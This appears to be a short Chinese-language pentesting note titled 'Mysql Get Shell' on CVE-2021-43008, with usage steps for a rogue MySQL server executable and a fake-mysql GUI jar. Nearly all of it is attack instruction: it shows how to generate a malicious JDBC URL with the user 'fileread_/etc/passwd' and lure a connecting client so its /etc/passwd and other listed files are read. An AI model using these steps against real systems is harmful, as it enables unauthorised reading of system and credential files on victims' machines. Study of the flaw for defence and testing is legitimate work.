[Mysql Get Shell](https://zhuanlan.zhihu.com/p/582577383)



## rogue_mysql_server.exe
CVE-2021-43008

数据库地址输入 x.x.x.x:3306 连接即可。 会读取config.yaml中的filelist

## fake-mysql-gui-0.0.2.jar
CVE-2021-43008

```sh
Payloadaddr 输入ip地址的上面的 Bindport
Mode: File Read
Cmd/File: /etc/passwd
点击  Generate Normal
得到 jdbc:mysql://192.168.142.1:52719/test?user=fileread_/etc/passwd

地址填:192.168.142.1:52719/
用户名填 fileread_/etc/passwd
其他随意填
```